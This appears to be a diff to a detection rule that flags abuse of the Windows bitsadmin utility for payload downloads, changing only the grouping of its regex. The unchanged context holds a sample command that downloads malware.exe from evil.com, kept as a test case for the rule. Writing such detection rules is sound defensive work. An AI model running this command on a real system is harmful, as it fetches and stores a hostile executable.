@@ -5,7 +5,7 @@ description: >
   Windows background transfer utility abused for payload downloads.
 
 pattern: |
-  (?i)bitsadmin.*/(transfer|download|addfile).*(https?|ftp)://
+  (?i)(bitsadmin.*/(transfer|download|addfile).*(https?|ftp)://)
 
 malicious:
   - "bitsadmin /transfer job http://evil.com/malware.exe C:\\malware.exe"
